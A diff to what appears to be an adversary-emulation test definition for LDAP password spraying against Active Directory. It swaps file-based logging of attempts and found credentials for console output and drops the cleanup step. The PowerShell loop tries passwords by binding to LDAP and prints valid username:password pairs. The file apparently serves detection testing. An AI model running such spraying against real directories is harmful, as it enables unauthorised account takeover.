@@ -73,10 +73,6 @@ atomic_tests:
       description: Domain FQDN
       type: String
       default: contoso.com
-    output_file:
-      description: Path to password spraying output
-      type: Path
-      default: C:\Windows\Temp\tmp.txt
     auth:
       description: authentication method to choose between "NTLM" and "Kerberos"
       type: string
@@ -102,15 +98,13 @@ atomic_tests:
           $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
           $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
           try {
-            " [-] Attempting ${password} on account ${user}." | Out-File -FilePath #{output_file} -Append
+            Write-Host " [-] Attempting ${password} on account ${user}."
             $conn.bind()
             # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
-            " [!] ${user}:${password} are valid credentials!" | Out-File -FilePath #{output_file} -Append
+            Write-Host " [!] ${user}:${password} are valid credentials!"
           } catch {
-            $_.Exception.Message | Out-File -FilePath #{output_file} -Append
+            Write-Host $_.Exception.Message
           }
         }
       }
-      "End of password spraying" | Out-File -FilePath #{output_file} -Append
-    cleanup_command: |
-      del #{output_file}
+      Write-Host "End of password spraying"
